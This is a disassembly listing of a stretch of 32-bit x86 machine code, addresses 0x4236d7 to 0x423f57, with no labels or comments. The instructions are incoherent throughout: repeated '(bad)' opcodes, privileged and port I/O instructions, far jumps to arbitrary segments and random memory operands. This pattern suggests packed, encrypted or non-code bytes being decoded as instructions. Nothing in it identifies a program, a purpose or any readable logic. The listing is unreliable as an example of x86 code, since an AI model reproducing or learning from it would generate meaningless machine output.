  4236d7:	xchg   DWORD PTR [ecx+0x1219c70d],edi
  4236dd:	shr    ecx,0xb9
  4236e0:	and    BYTE PTR [esi],bl
  4236e2:	enter  0x47c0,0xa7
  4236e6:	pushf  
  4236e7:	fcomp  DWORD PTR [edi+0x17]
  4236ea:	jno    0x42373c
  4236ec:	add    al,0xc1
  4236ee:	adc    DWORD PTR [edi+0x79],edx
  4236f1:	push   esi
  4236f2:	aaa    
  4236f3:	inc    ebp
  4236f4:	push   ebx
  4236f5:	mov    ds:0x37007b8f,eax
  4236fb:	xor    BYTE PTR [ebp+0x68],dl
  4236fe:	pop    ebx
  4236ff:	lods   eax,DWORD PTR ds:[esi]
  423700:	sub    ecx,DWORD PTR [edx-0x1746d6de]
  423706:	(bad)  
  423707:	aam    0xd5
  423709:	in     eax,0x40
  42370b:	add    eax,0xa85eded2
  423710:	pop    ecx
  423711:	rol    BYTE PTR [edx+ecx*4-0x62],cl
  423715:	test   al,0x1c
  423717:	out    dx,al
  423718:	inc    edi
  423719:	mov    ecx,0x24a51a7b
  42371e:	pop    esi
  42371f:	imul   edx,DWORD PTR [edx+0x2750c4e3],0x5fe69953
  423729:	jo     0x42379a
  42372b:	cs pop esp
  42372d:	in     al,0xd9
  42372f:	xchg   esi,eax
  423730:	and    esp,edx
  423732:	shl    BYTE PTR ds:0xbd1ddfe0,1
  423738:	(bad)  
  423739:	(bad)  
  42373b:	mov    WORD PTR [ebx+0x4d],fs
  42373e:	pop    es
  42373f:	xchg   edx,eax
  423740:	loop   0x42373e
  423742:	pop    ebp
  423743:	jno    0x4236ff
  423745:	cmp    ebx,DWORD PTR [eax]
  423747:	push   edx
  423748:	sub    DWORD PTR [esi],esp
  42374a:	sub    BYTE PTR [ebp+0x33],dl
  42374d:	lock mov ds:0xdbeb45ee,al
  423753:	stc    
  423754:	je     0x4237b7
  423756:	push   cs
  423757:	clc    
  423758:	mov    ecx,cr1
  42375b:	xor    ch,BYTE PTR [edi]
  42375d:	int3   
  42375e:	std    
  42375f:	inc    esp
  423760:	xor    BYTE PTR [edx-0x7e],ah
  423763:	mov    bh,0x18
  423765:	inc    edx
  423766:	mov    ds:0x462c52a2,al
  42376b:	adc    ecx,ebp
  42376d:	arpl   WORD PTR [ebx],sp
  42376f:	mov    ds:0x94240aad,al
  423774:	pop    eax
  423775:	fstp   QWORD PTR [eax+0x793c1cd1]
  42377b:	jbe    0x42370b
  42377d:	cmp    ebx,esp
  42377f:	push   ds
  423780:	add    BYTE PTR [eax-0x51],cl
  423783:	cmp    eax,0x8a1f0557
  423788:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423789:	mov    dl,0xf0
  42378b:	pop    ebx
  42378c:	cmp    DWORD PTR [edx*1+0x2c27a845],ebp
  423793:	gs test eax,0x741eba77
  423799:	push   edi
  42379a:	xor    al,0x72
  42379c:	adc    DWORD PTR [eax+0x79c7ede2],ecx
  4237a2:	mov    bh,0xa7
  4237a4:	imul   ebx,DWORD PTR [esi-0x5a300184],0x84173bb
  4237ae:	jno    0x423806
  4237b0:	cmp    ebp,DWORD PTR [ecx-0x3896d6ed]
  4237b6:	shl    DWORD PTR [edi+0x1ab53aa5],1
  4237bc:	xchg   edx,eax
  4237bd:	jecxz  0x4237d9
  4237bf:	test   eax,0xeccf2b11
  4237c4:	and    esp,ecx
  4237c6:	jecxz  0x423757
  4237c8:	not    BYTE PTR [edi]
  4237ca:	neg    BYTE PTR [eax-0x6b6d847]
  4237d0:	mov    al,0xc1
  4237d2:	push   ss
  4237d3:	imul   ebp,DWORD PTR [eax-0x50],0xda8edc61
  4237da:	retf   0x1758
  4237dd:	aam    0xbe
  4237df:	das    
  4237e0:	mov    BYTE PTR [edi-0x2a],dh
  4237e3:	mov    al,0x2f
  4237e5:	jge    0x4237f3
  4237e7:	mov    ds:0xb941dc61,al
  4237ec:	bswap  edi
  4237ee:	sbb    dl,BYTE PTR [ebx]
  4237f0:	dec    eax
  4237f1:	stos   BYTE PTR es:[edi],al
  4237f2:	xor    ebx,0xffffffb0
  4237f5:	inc    esi
  4237f6:	fwait
  4237f7:	cmp    DWORD PTR [ebp-0x19],ecx
  4237fa:	outs   dx,BYTE PTR ds:[esi]
  4237fb:	shl    BYTE PTR [eax-0x7d0b4abf],cl
  423801:	adc    bh,BYTE PTR es:[edx]
  423804:	xor    edi,DWORD PTR [ebx-0x3]
  423807:	dec    edi
  423808:	push   es
  423809:	and    eax,0xb2406939
  42380e:	clc    
  42380f:	inc    esi
  423810:	jge    0x4237a9
  423812:	std    
  423813:	mov    ebp,0x82c187f5
  423818:	and    al,0xdc
  42381a:	push   ss
  42381b:	sub    al,0xdf
  42381d:	cmp    ah,BYTE PTR [esi]
  42381f:	sub    al,0xf4
  423821:	inc    ecx
  423822:	xchg   BYTE PTR [ecx+ecx*2],al
  423825:	push   0x6a
  423827:	sub    eax,0x1d328451
  42382c:	fcmovnbe st,st(6)
  42382e:	mov    DWORD PTR [edx],ebx
  423830:	arpl   dx,cx
  423832:	leave  
  423833:	sub    eax,0x35177a57
  423838:	sub    cl,BYTE PTR [edx-0x4d08c147]
  42383e:	fdivr  QWORD PTR [ebx]
  423840:	or     cl,BYTE PTR [ecx-0x67fc8c4]
  423846:	add    DWORD PTR [ecx+edx*4-0x3f58dc6],esi
  42384d:	(bad)  
  42384e:	stos   DWORD PTR es:[edi],eax
  42384f:	mov    ebx,0x9f1d04d9
  423854:	mov    ds:0x41e196a8,eax
  423859:	std    
  42385a:	sbb    eax,0xe55e4822
  42385f:	jno    0x423825
  423861:	sbb    eax,0xfba104cc
  423866:	gs cmp ebp,esi
  423869:	hlt    
  42386a:	sbb    ebp,DWORD PTR [ebp-0x2e98d4a6]
  423870:	loop   0x423851
  423872:	push   ebp
  423873:	out    dx,eax
  423874:	out    0x65,al
  423876:	stc    
  423877:	popa   
  423878:	(bad)
  42387c:	xchg   esp,eax
  42387d:	mov    WORD PTR [ebx-0x49],?
  423880:	inc    ebp
  423881:	jno    0x423827
  423883:	mov    eax,0xac915892
  423888:	repz not eax
  42388b:	std    
  42388c:	add    al,0xa8
  42388e:	into   
  42388f:	mov    edx,0x7758d442
  423894:	jnp    0x4238da
  423896:	jno    0x423884
  423898:	enter  0x73f,0x50
  42389c:	mov    ch,0x66
  42389e:	test   BYTE PTR [eax],dh
  4238a0:	nop
  4238a1:	data16 lock mov ah,0xd8
  4238a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4238a6:	imul   esp
  4238a8:	jle    0x4238f3
  4238aa:	call   0xbd245fad
  4238af:	jmp    0x9999:0xecafe1cb
  4238b6:	sbb    esp,edx
  4238b8:	fstp   TBYTE PTR [edi-0x77203496]
  4238be:	mov    ?,WORD PTR [esp+edx*4+0x3e]
  4238c2:	js     0x423913
  4238c4:	sbb    al,0x64
  4238c6:	fnstenv ds:0xf7f0c290
  4238cc:	sbb    al,0x75
  4238ce:	test   al,0x3a
  4238d0:	jmp    0x423869
  4238d2:	or     ecx,ebx
  4238d4:	ds fcmove st,st(4)
  4238d7:	or     eax,0x5939aee3
  4238dc:	jg     0x423904
  4238de:	out    0x34,eax
  4238e0:	(bad)  
  4238e1:	jg     0x4238ff
  4238e3:	iret   
  4238e4:	push   esi
  4238e5:	xchg   BYTE PTR ds:0xd1eee176,cl
  4238eb:	mov    ds:0x357e7644,al
  4238f0:	sub    al,0x99
  4238f2:	cmc    
  4238f3:	and    dh,BYTE PTR ds:0x7a77783c
  4238f9:	(bad)  
  4238fa:	not    DWORD PTR [eax-0x2a61086d]
  423900:	mov    dl,0x3d
  423902:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423903:	dec    ecx
  423904:	out    dx,eax
  423905:	cmp    DWORD PTR [esi],0x2afb7d16
  42390b:	cmc    
  42390c:	jl     0x42393c
  42390e:	inc    edx
  42390f:	xchg   ebp,eax
  423910:	and    ecx,DWORD PTR [edx+0x1bfbd553]
  423916:	int3   
  423917:	push   edx
  423918:	pop    ecx
  423919:	int3   
  42391a:	xor    al,0xb5
  42391c:	add    dl,BYTE PTR [esi-0x4d9eca31]
  423922:	mov    dl,0x5f
  423924:	ss mov dl,ah
  423927:	dec    esp
  423928:	and    DWORD PTR [ecx+0x22febd11],ecx
  42392e:	push   edi
  42392f:	jbe    0x42391e
  423931:	dec    esi
  423932:	mov    WORD PTR [esi+0x5c],ds
  423935:	xor    BYTE PTR [ebx+0x34],0x67
  423939:	dec    ebx
  42393a:	sub    DWORD PTR [eax+0x58],0xffffff84
  42393e:	mov    WORD PTR [ebp+ebx*4-0x4f],?
  423942:	sahf   
  423943:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423944:	and    esi,esi
  423946:	popf   
  423947:	sti    
  423948:	mov    ch,0xae
  42394a:	mov    fs,WORD PTR [edx]
  42394c:	add    al,0xbe
  42394e:	mov    ebx,0xc4168414
  423953:	rol    esi,cl
  423955:	out    0xc3,eax
  423957:	js     0x423968
  423959:	mov    ds:0x10276194,al
  42395e:	dec    esp
  42395f:	push   cs
  423960:	push   0x6a430c60
  423965:	pusha  
  423966:	fsubr  QWORD PTR [edi-0x1cc99086]
  42396c:	daa    
  42396d:	push   cs
  42396e:	call   esp
  423970:	xor    eax,0xaf5110d8
  423975:	xchg   ebx,eax
  423976:	jmp    0x9c813839
  42397b:	pop    esi
  42397c:	jmp    0x7ee0:0x904b6350
  423983:	xor    BYTE PTR [edi-0x3b],0xbd
  423987:	ja     0x4239bf
  423989:	xchg   BYTE PTR [eax+0x79],ch
  42398c:	dec    edi
  42398d:	sbb    eax,0x698e59e
  423992:	mov    dl,0xe4
  423994:	in     eax,0x35
  423996:	cmp    bl,BYTE PTR [edx]
  423998:	ror    edx,0xd0
  42399b:	fdivr  QWORD PTR gs:[eax+ebp*1+0x7c9d2490]
  4239a3:	into   
  4239a4:	jge    0x423961
  4239a6:	inc    BYTE PTR [edx]
  4239a8:	loop   0x423931
  4239aa:	jb     0x42394e
  4239ac:	or     ch,BYTE PTR [edi+edx*8-0x5a5caf22]
  4239b3:	jnp    0x423a08
  4239b5:	(bad)  
  4239b6:	push   ss
  4239b7:	adc    ch,BYTE PTR [ecx+eiz*4]
  4239ba:	test   eax,ecx
  4239bc:	push   esi
  4239bd:	nop
  4239be:	jnp    0x4239ec
  4239c0:	(bad)  
  4239c1:	mov    DWORD PTR [ebx],esp
  4239c3:	sub    edx,ebp
  4239c5:	cmc    
  4239c6:	pop    edi
  4239c7:	dec    edi
  4239c8:	xor    ebx,eax
  4239ca:	dec    esp
  4239cb:	jne    0x761f2ce4
  4239d1:	jbe    0x423964
  4239d3:	cmp    ch,bl
  4239d5:	sub    al,0x9a
  4239d7:	not    BYTE PTR [ecx+0x27]
  4239da:	(bad)  
  4239db:	lea    ebp,[edi+0x2c23412d]
  4239e1:	sub    al,0x9a
  4239e3:	call   0xba94:0xdae4cf4b
  4239ea:	bound  ecx,QWORD PTR [eax]
  4239ec:	jns    0x423a27
  4239ee:	push   esp
  4239ef:	jbe    0x423a0b
  4239f1:	test   BYTE PTR [esp+ebp*2-0xd54322f],bl
  4239f8:	jae    0x4239ad
  4239fa:	fdivr  QWORD PTR ds:0x1b52a358
  423a00:	inc    esp
  423a01:	cmp    ch,cl
  423a03:	add    eax,0x901d2d79
  423a08:	jg     0x42398c
  423a0a:	and    al,0x4f
  423a0c:	jne    0x4239d1
  423a0e:	loopne 0x423a8b
  423a10:	(bad)  
  423a11:	jg     0x423a5a
  423a13:	in     eax,0xc2
  423a15:	sahf   
  423a16:	aaa    
  423a17:	aas    
  423a18:	adc    al,0x75
  423a1a:	fstp   DWORD PTR [edx-0x46fb0bfa]
  423a20:	jbe    0x4239d1
  423a22:	pop    ecx
  423a23:	mov    ch,0xe8
  423a25:	out    dx,al
  423a26:	mov    esp,0x6a410296
  423a2b:	jno    0x423a6b
  423a2d:	dec    ebx
  423a2e:	dec    ebp
  423a2f:	push   0x6c3c385c
  423a34:	popf   
  423a35:	shl    DWORD PTR ds:0xe1617be1,0xf5
  423a3c:	inc    ebp
  423a3d:	fnsave [ecx-0x5ee4855b]
  423a43:	sub    BYTE PTR [edi+0x6ebc499a],ch
  423a49:	mov    fs,WORD PTR [edx]
  423a4b:	mov    bh,0xee
  423a4d:	stc    
  423a4e:	dec    esp
  423a4f:	fild   QWORD PTR [edi*8+0x5955f7c3]
  423a56:	xlat   BYTE PTR ds:[ebx]
  423a57:	out    dx,eax
  423a58:	or     edi,DWORD PTR [edx]
  423a5a:	in     eax,dx
  423a5b:	mov    al,BYTE PTR [eax]
  423a5d:	sar    BYTE PTR [eax+0x2d],0x3c
  423a61:	xchg   edi,eax
  423a62:	jl     0x423a67
  423a64:	fld    TBYTE PTR [edi]
  423a66:	in     al,0xf3
  423a68:	es call 0x781c:0xf765045a
  423a70:	inc    edx
  423a71:	fwait
  423a72:	shr    BYTE PTR [edx+0x6ec28e38],cl
  423a78:	inc    ebx
  423a79:	mov    ds:0xcd38ebce,eax
  423a7e:	scas   al,BYTE PTR es:[edi]
  423a7f:	mov    al,0x48
  423a81:	mov    ah,0xde
  423a83:	inc    BYTE PTR [ebp+eiz*1-0x6c]
  423a87:	leave  
  423a88:	dec    ebx
  423a89:	lahf   
  423a8a:	and    DWORD PTR es:[ecx],ecx
  423a8d:	stos   DWORD PTR es:[edi],eax
  423a8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423a8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a90:	iret   
  423a91:	xchg   edi,eax
  423a92:	xor    eax,0x79411095
  423a97:	in     al,0xc9
  423a99:	jle    0x423b05
  423a9b:	push   0xa82eefb4
  423aa0:	mov    al,ds:0x3f35f52e
  423aa5:	xchg   DWORD PTR [esi+0x54845b87],ebp
  423aab:	dec    esi
  423aac:	sub    ah,bl
  423aae:	inc    edi
  423aaf:	ret    0xe18
  423ab2:	es dec edi
  423ab4:	popa   
  423ab5:	test   BYTE PTR [ebx+0x5b],ch
  423ab8:	ja     0x423b10
  423aba:	mov    bl,0xbf
  423abc:	adc    eax,0xdd093243
  423ac1:	jmp    0xa3dc:0xfc977b78
  423ac8:	sbb    eax,DWORD PTR [edx+ebp*8]
  423acb:	sbb    eax,0x48f74005
  423ad0:	sub    eax,0x23d1eb28
  423ad5:	or     ah,BYTE PTR [edx-0x68c95b48]
  423adb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423adc:	mov    WORD PTR [edi],fs
  423ade:	add    ch,al
  423ae0:	pushf  
  423ae1:	call   0xd1ed:0xa655c11d
  423ae8:	pop    es
  423ae9:	lea    ebx,[edi-0x79]
  423aec:	adc    al,0x80
  423aee:	inc    ebp
  423aef:	test   eax,0xbeb4c6f7
  423af4:	pop    eax
  423af5:	popa   
  423af6:	sbb    eax,0xc1253b8d
  423afb:	lods   al,BYTE PTR ds:[esi]
  423afc:	lock in eax,0x57
  423aff:	mov    ebp,DWORD PTR [ecx]
  423b01:	add    eax,0x8e6d55c1
  423b06:	data16 jns 0x423ab9
  423b09:	sbb    edi,DWORD PTR [edi]
  423b0b:	popf   
  423b0c:	xchg   DWORD PTR [ecx],ebx
  423b0e:	jno    0x423b2e
  423b10:	test   BYTE PTR [ebx],ch
  423b12:	lahf   
  423b13:	inc    eax
  423b14:	mov    ebp,0x891ab336
  423b19:	mov    DWORD PTR [edx],0x559b59f3
  423b1f:	lahf   
  423b20:	xchg   bl,ah
  423b22:	lds    eax,FWORD PTR fs:[eax-0x9]
  423b26:	leave  
  423b27:	repz repz jecxz 0x423ba2
  423b2b:	xor    ebx,edx
  423b2d:	or     bl,BYTE PTR [eax-0x4e]
  423b30:	std    
  423b31:	xchg   ecx,eax
  423b32:	adc    al,0x8c
  423b34:	cdq    
  423b35:	out    0xf0,al
  423b37:	aam    0x63
  423b39:	sub    eax,0x865bbac3
  423b3e:	push   ebx
  423b3f:	pop    esp
  423b40:	push   edi
  423b41:	stos   BYTE PTR es:[edi],al
  423b42:	or     DWORD PTR [esp+eax*2+0x52708f24],ebp
  423b49:	or     ebp,DWORD PTR [eax+ebp*2]
  423b4c:	push   ds
  423b4d:	inc    edx
  423b4e:	dec    esp
  423b4f:	sbb    DWORD PTR [eax-0x1396069e],eax
  423b55:	shl    DWORD PTR [ebx],1
  423b57:	jle    0x423af2
  423b59:	pop    es
  423b5a:	lds    ebp,FWORD PTR [eax+0x33]
  423b5d:	mov    cl,0xda
  423b5f:	sbb    ebp,ecx
  423b61:	adc    edi,0xc371a202
  423b67:	outs   dx,BYTE PTR ds:[esi]
  423b68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b69:	sbb    edi,DWORD PTR [esi+0x26]
  423b6c:	je     0x423ba2
  423b6e:	lahf   
  423b6f:	mov    ebp,DWORD PTR [ebp+0x13472560]
  423b75:	scas   al,BYTE PTR es:[edi]
  423b76:	xor    DWORD PTR [edi],ebx
  423b78:	push   cs
  423b79:	jmp    0xf7e0c1f1
  423b7e:	add    BYTE PTR [ebx+ecx*2+0x6ba713e9],0x54
  423b86:	fidiv  DWORD PTR [esi-0x3c]
  423b89:	fisub  DWORD PTR [edx+0x45]
  423b8c:	lods   al,BYTE PTR ds:[esi]
  423b8d:	or     eax,0xadb57823
  423b92:	das    
  423b93:	std    
  423b94:	test   al,0x19
  423b96:	cwde   
  423b97:	std    
  423b98:	cmp    ebp,DWORD PTR [ebx-0x6c]
  423b9b:	mov    eax,0xc9b95fef
  423ba0:	mov    al,ds:0xfe517c78
  423ba5:	add    BYTE PTR [ecx+0x43],dl
  423ba8:	nop
  423ba9:	rcr    BYTE PTR [esi],1
  423bab:	pushf  
  423bac:	daa    
  423bad:	jle    0x423bdc
  423baf:	(bad)  
  423bb0:	out    dx,eax
  423bb1:	add    al,0xee
  423bb3:	aaa    
  423bb4:	xchg   BYTE PTR [esp+esi*4-0x8],ah
  423bb8:	cmp    eax,0x2ab3acbd
  423bbd:	ins    BYTE PTR es:[edi],dx
  423bbe:	mov    cl,0xef
  423bc0:	add    DWORD PTR [ebp-0x6e],esi
  423bc3:	cli    
  423bc4:	xchg   ebx,eax
  423bc5:	add    edi,DWORD PTR [eax+0x72dbd06]
  423bcb:	(bad)  
  423bcc:	into   
  423bcd:	cmp    bh,bl
  423bcf:	jmp    0xc109:0xb4b286ea
  423bd6:	mov    ah,0xa1
  423bd8:	dec    ebx
  423bd9:	les    ebx,FWORD PTR [eax+0x623d8040]
  423bdf:	or     DWORD PTR [edx+0x24],eax
  423be2:	je     0x423b72
  423be4:	addr16 xor eax,0x395ca1ce
  423bea:	mov    eax,ds:0xd044a2a7
  423bef:	mov    dl,0x48
  423bf1:	fnstsw WORD PTR [esi-0x4c838b55]
  423bf7:	enter  0x6c71,0xa9
  423bfb:	rcr    DWORD PTR [eax],cl
  423bfd:	stos   DWORD PTR es:[edi],eax
  423bfe:	pusha  
  423bff:	test   BYTE PTR [ecx+0x70e78f4a],dl
  423c05:	mul    DWORD PTR [ebx+0x1]
  423c08:	sahf   
  423c09:	pop    es
  423c0a:	mov    ds:0xfb5bfc9f,al
  423c0f:	movsx  ecx,ch
  423c12:	aas    
  423c13:	outs   dx,BYTE PTR ds:[esi]
  423c14:	cmc    
  423c15:	and    ah,BYTE PTR [edi+0x55bdedfb]
  423c1b:	call   0xf812:0xc30f47a1
  423c22:	mov    al,BYTE PTR [edx-0x52ee7a94]
  423c28:	or     dl,BYTE PTR [ecx]
  423c2a:	imul   edi,DWORD PTR ds:0x6b93db5d,0x6b
  423c31:	mov    ds:0xab5bce4d,al
  423c36:	aaa    
  423c37:	stos   BYTE PTR es:[edi],al
  423c38:	xchg   esi,eax
  423c39:	fcom   QWORD PTR [ecx-0x79a344cb]
  423c3f:	outs   dx,BYTE PTR ds:[esi]
  423c40:	add    DWORD PTR [ecx-0x257fc392],edx
  423c46:	inc    esp
  423c47:	into   
  423c48:	out    dx,al
  423c49:	stos   DWORD PTR es:[edi],eax
  423c4a:	dec    edx
  423c4b:	mov    BYTE PTR [ebx+0x6d596335],al
  423c51:	imul   edx,DWORD PTR [edx],0x2d
  423c54:	stc    
  423c55:	sub    eax,0xa008aaa1
  423c5a:	jge    0x423c64
  423c5c:	mov    esp,0x3992b87c
  423c61:	push   edx
  423c62:	(bad)  
  423c63:	and    ecx,edi
  423c65:	ficomp DWORD PTR [edi]
  423c67:	leave  
  423c68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423c69:	in     al,dx
  423c6a:	mov    ds:0x4fb5fd2c,eax
  423c6f:	push   0xffffffb8
  423c71:	sbb    BYTE PTR [ebx-0x2a],dh
  423c74:	xor    ch,ah
  423c76:	das    
  423c77:	or     al,0xa7
  423c79:	jp     0x423c51
  423c7b:	sbb    eax,0xf26c2548
  423c80:	outs   dx,DWORD PTR ds:[esi]
  423c81:	cmp    al,0xdb
  423c83:	leave  
  423c84:	inc    esp
  423c85:	out    0x7,eax
  423c87:	retf   
  423c88:	cld    
  423c89:	adc    cl,BYTE PTR [edx-0x10478f66]
  423c8f:	jo     0x423cb9
  423c91:	lods   al,BYTE PTR ds:[esi]
  423c92:	sub    BYTE PTR [edx+0x9],dh
  423c95:	in     eax,dx
  423c96:	aam    0x0
	...
  423d14:	retf   0xe76a
  423d17:	ja     0x423d00
  423d19:	(bad)  
  423d1a:	(bad)  
  423d1c:	daa    
  423d1d:	inc    ebx
  423d1e:	call   0x8b1d669d
  423d23:	pop    esp
  423d24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d25:	rol    DWORD PTR [ecx],1
  423d27:	add    BYTE PTR [ebx+0x7],ch
  423d2a:	add    BYTE PTR [eax],al
  423d2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d2d:	sbb    DWORD PTR [ebp+0x6fb3a8e1],ecx
  423d33:	mov    esp,0x66096dcc
  423d38:	pusha  
  423d39:	ret    0xf425
  423d3c:	nop
  423d3d:	aad    0xf4
  423d3f:	fcmovnbe st,st(6)
  423d41:	sub    ebp,DWORD PTR [ebx+0xf8ca249]
  423d47:	repnz out 0xf3,al
  423d4a:	inc    ecx
  423d4b:	loope  0x423d94
  423d4d:	addr16 mov cl,0xa4
  423d50:	and    BYTE PTR [eax],bh
  423d52:	pop    es
  423d53:	mov    ecx,0xf99373a6
  423d58:	pop    eax
  423d59:	pop    ecx
  423d5a:	imul   edi,eax,0xca38830c
  423d60:	or     al,0xc7
  423d62:	mov    ebx,0xbf55261d
  423d67:	adc    edx,0x51
  423d6a:	xchg   ebp,eax
  423d6b:	neg    DWORD PTR [edx+0x6c]
  423d6e:	add    ecx,DWORD PTR [esi]
  423d70:	shl    BYTE PTR [edi-0x15],0xf6
  423d74:	pop    ecx
  423d75:	push   0x21
  423d77:	(bad)  
  423d78:	jmp    0xee2aa6fb
  423d7d:	adc    edi,DWORD PTR [esi+0x4a]
  423d80:	into   
  423d81:	es push 0x5e20cba
  423d87:	jle    0x423d6e
  423d89:	mov    ebx,0x7a921782
  423d8e:	scas   al,BYTE PTR es:[edi]
  423d8f:	jg     0x423d30
  423d91:	int    0x6f
  423d93:	push   edi
  423d94:	sbb    eax,0xd076ca39
  423d99:	imul   ebp,DWORD PTR [eax],0xfffffffc
  423d9c:	xchg   DWORD PTR [esi+0x55],esi
  423d9f:	aas    
  423da0:	std    
  423da1:	jl     0x423d83
  423da3:	hlt    
  423da4:	mov    WORD PTR [edx-0x1b],ds
  423da7:	or     ch,BYTE PTR [edx-0xbe728ab]
  423dad:	jmp    0xe196f571
  423db2:	xor    BYTE PTR [eax+ebx*4+0x74c7517f],0x49
  423dba:	xor    ch,BYTE PTR [ebp+0x4]
  423dbd:	cld    
  423dbe:	fst    QWORD PTR [ecx+edi*4+0x5a4d8fe9]
  423dc5:	in     eax,0x7c
  423dc7:	out    dx,eax
  423dc8:	popa   
  423dc9:	(bad)  
  423dcb:	inc    eax
  423dcc:	addr16 pop ebx
  423dce:	(bad)  
  423dcf:	adc    ch,bh
  423dd1:	(bad)
  423dd4:	enter  0x9554,0xa4
  423dd8:	test   eax,0x408d0b3a
  423ddd:	cmp    BYTE PTR [esi],al
  423ddf:	inc    esp
  423de0:	xchg   edi,eax
  423de1:	clc    
  423de2:	pop    edi
  423de3:	xor    eax,0xf960b6f8
  423de8:	sub    DWORD PTR fs:[eax+0x52],ecx
  423dec:	jnp    0x423e60
  423dee:	ret    
  423def:	add    DWORD PTR [edi],0x98740c26
  423df5:	xchg   esi,eax
  423df6:	aad    0x6d
  423df8:	xchg   ebx,eax
  423df9:	xor    al,0xfa
  423dfb:	(bad)  
  423dfc:	and    BYTE PTR [ecx+ebp*2],ch
  423dff:	push   0x801b34e5
  423e04:	pushf  
  423e05:	add    BYTE PTR [ebx+0x5ba218d3],bl
  423e0b:	inc    edx
  423e0c:	fwait
  423e0d:	lds    ebp,FWORD PTR [edx-0x76]
  423e10:	add    DWORD PTR [ebx+0x17],ebx
  423e13:	xchg   ebx,eax
  423e14:	sbb    ax,0x7da0
  423e18:	cmp    al,0x70
  423e1a:	(bad)  
  423e1b:	mov    bh,0x75
  423e1d:	inc    ebp
  423e1e:	add    dl,BYTE PTR [esi+0x5bb5a03c]
  423e24:	rcr    BYTE PTR [ebx],1
  423e26:	outs   dx,BYTE PTR ds:[esi]
  423e27:	push   0x8017d663
  423e2c:	xchg   edi,eax
  423e2d:	or     bh,BYTE PTR [di-0x18]
  423e31:	iret   
  423e32:	adc    DWORD PTR [ebp-0x2e122296],ebx
  423e38:	xor    dl,BYTE PTR [edi]
  423e3a:	ins    DWORD PTR es:[edi],dx
  423e3b:	push   ebp
  423e3c:	inc    ebx
  423e3d:	dec    ecx
  423e3e:	sub    al,0xd9
  423e40:	mov    dh,0x66
  423e42:	jns    0x423df9
  423e44:	pop    eax
  423e45:	sbb    DWORD PTR [ecx+0x3],ebx
  423e48:	mov    ds:0xbc0ed586,al
  423e4d:	std    
  423e4e:	push   edx
  423e4f:	xor    al,BYTE PTR [edx*2-0x5a80a1da]
  423e56:	cmovno edi,DWORD PTR [esi+0x64cdef3]
  423e5d:	push   ds
  423e5e:	xor    eax,0x19082ceb
  423e63:	xchg   ebx,eax
  423e64:	xor    esp,DWORD PTR [edx+0x5e]
  423e67:	sub    DWORD PTR [edi-0x27],esi
  423e6a:	(bad)  
  423e6b:	lods   al,BYTE PTR ds:[esi]
  423e6c:	jge    0x423e00
  423e6e:	jmp    0xd67b:0xf70ee365
  423e75:	call   0xef461f94
  423e7a:	mov    dl,0x7d
  423e7c:	xchg   BYTE PTR [edi-0x610c4ef4],dl
  423e82:	xchg   BYTE PTR [edx+0x4f],ch
  423e85:	or     eax,0x23c003b4
  423e8a:	add    ebp,esp
  423e8c:	or     BYTE PTR [ebp+ebx*1+0x641c15b1],dh
  423e93:	jl     0x423e52
  423e95:	fsubr  DWORD PTR [eax+0x75a6fd4]
  423e9b:	dec    ebp
  423e9c:	cmp    dh,BYTE PTR [ebp+0x6da9a453]
  423ea2:	cs cs cmp eax,0x5d74557a
  423ea9:	ror    BYTE PTR [ebx],cl
  423eab:	dec    edx
  423eac:	(bad)  
  423eae:	fucomip st,st(1)
  423eb0:	or     DWORD PTR ds:0xc869c8b3,ebp
  423eb6:	xchg   ecx,eax
  423eb7:	pop    edi
  423eb8:	daa    
  423eb9:	sub    al,0xbd
  423ebb:	push   esp
  423ebc:	mov    esp,0x1c7f2286
  423ec1:	daa    
  423ec2:	cmp    al,0xc
  423ec4:	jmp    0x423eac
  423ec6:	push   es
  423ec7:	pop    edx
  423ec8:	mov    edx,0x6452dc69
  423ecd:	mov    ebx,0x908749e1
  423ed2:	loope  0x423e9c
  423ed4:	test   ah,cl
  423ed6:	retf   
  423ed7:	add    eax,0x787285d
  423edc:	push   esp
  423edd:	or     dh,BYTE PTR [ebp+ebx*2-0x14]
  423ee1:	add    ah,BYTE PTR [ebx]
  423ee3:	sub    edi,esi
  423ee5:	xlat   BYTE PTR ds:[ebx]
  423ee6:	mov    eax,ds:0x2e5b5b14
  423eeb:	push   ecx
  423eec:	adc    edx,DWORD PTR [eax+ebx*8+0x14bc0dad]
  423ef3:	cmp    al,0x58
  423ef5:	pop    ebx
  423ef6:	popa   
  423ef7:	cli    
  423ef8:	jbe    0x423f09
  423efa:	cdq    
  423efb:	pop    ecx
  423efc:	dec    edx
  423efd:	and    cl,BYTE PTR ds:0x9437cba7
  423f03:	pop    ebp
  423f04:	mov    esi,0xc8d0eef3
  423f09:	cmp    al,0x4e
  423f0b:	shl    DWORD PTR [ebx-0x7a],cl
  423f0e:	mov    ebp,0xd97e07a3
  423f13:	imul   edx,eax,0x87d0f5ec
  423f19:	sub    BYTE PTR [edx],cl
  423f1b:	icebp  
  423f1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f1d:	sbb    BYTE PTR [eax],0x4d
  423f20:	pop    edx
  423f21:	(bad)  
  423f22:	cmp    BYTE PTR [ecx-0x6db1cfc5],dh
  423f28:	fistp  WORD PTR [esi-0x7e]
  423f2b:	mov    ds:0x961ee89e,al
  423f30:	popf   
  423f31:	inc    esi
  423f32:	jne    0x423ee6
  423f34:	nop
  423f35:	repnz nop
  423f37:	(bad)  
  423f38:	push   cs
  423f39:	jmp    0x423f55
  423f3b:	sub    DWORD PTR [esi],eax
  423f3d:	leave  
  423f3e:	nop
  423f3f:	pop    ds
  423f40:	jbe    0x423ec9
  423f42:	dec    ecx
  423f43:	pushf  
  423f44:	xor    ecx,DWORD PTR [esi+0x386f2bd7]
  423f4a:	pop    edi
  423f4b:	imul   edx
  423f4d:	mov    ds:0xa9feac86,al
  423f52:	test   eax,0xc9d0e035
  423f57:	add    eax,0xa2893d9
